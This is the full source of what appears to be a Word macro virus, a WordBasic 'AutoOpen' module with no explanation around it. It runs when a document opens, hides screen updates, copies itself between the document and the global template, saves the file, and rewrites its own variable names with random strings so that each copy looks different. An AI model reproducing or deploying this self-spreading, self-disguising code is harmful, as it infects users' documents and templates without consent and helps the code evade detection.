   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim DUHIM$
   Dim DCLUL
   Dim PPWMS
   Dim A$
   Dim B$
   Dim C$
   On Error Resume Next
   WordBasic.ScreenUpdating 0
   DUHIM$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy DUHIM$ + ":AutoOpen", "AutoOpen"
   WordBasic.MacroCopy "AutoOpen", DUHIM$ + ":AutoOpen"
   WordBasic.FileSaveAs Format:=1
   DCLUL = WordBasic.Int(Rnd() * 3 + 5)
   For PPWMS = 1 To DCLUL
   A$ = A$ + Chr(WordBasic.Int(Rnd() * 26) + 65)
   B$ = B$ + Chr(WordBasic.Int(Rnd() * 26) + 65)
   C$ = C$ + Chr(WordBasic.Int(Rnd() * 26) + 65)
   Next PPWMS
   WordBasic.ToolsMacro Name:="AutoOpen", Edit:=1
   WordBasic.EditReplace Find:="DUHIM", Replace:=A$, ReplaceAll:=1
   WordBasic.EditReplace Find:="PPWMS", Replace:=B$, ReplaceAll:=1
   WordBasic.EditReplace Find:="DCLUL", Replace:=C$, ReplaceAll:=1
   WordBasic.DocClose 1
   End Sub
